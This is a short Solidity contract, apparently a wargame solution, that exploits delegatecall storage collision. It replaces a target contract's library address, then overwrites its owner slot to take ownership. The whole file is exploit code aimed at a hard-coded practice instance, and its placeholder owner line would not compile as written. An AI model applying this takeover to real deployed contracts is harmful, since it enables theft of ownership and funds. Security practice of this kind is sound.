//creating a band library and feeding it to the contract
//library should not have vars since it uses callers context (delegatecall)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BadLibrary {
    address public placeholderAddr1;
    address public placeholderAddr2;
    address public owner;

    function run() external {
        address instAddr = 0x613E35D51e2215d548e7A002880c6971e8Cf9ba1; //your instance addrr
        (bool success, )= instAddr.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160(address(this)))));
        require(success, "phase1 success");
        (success, ) = instAddr.call(abi.encodeWithSignature("setFirstTime(uint256)", uint256(uint160("your addr"))));
        require(success, "phase2 success");
    }

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }
}